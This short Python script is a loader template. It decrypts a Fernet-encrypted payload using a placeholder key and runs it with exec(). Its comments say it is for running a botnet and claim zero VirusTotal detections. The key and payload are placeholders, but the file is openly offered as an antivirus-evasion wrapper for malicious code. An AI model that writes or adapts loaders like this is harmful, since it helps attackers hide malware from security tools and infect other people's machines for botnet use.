from cryptography.fernet import Fernet

key = b'KEY HERE!' 

encrypted_code = b'CODE Here!'

cipher_suite = Fernet(key)

decrypted_code = cipher_suite.decrypt(encrypted_code).decode()
exec(decrypted_code)

## USE This Code to run your botnet!
# 0 --> VirusTotal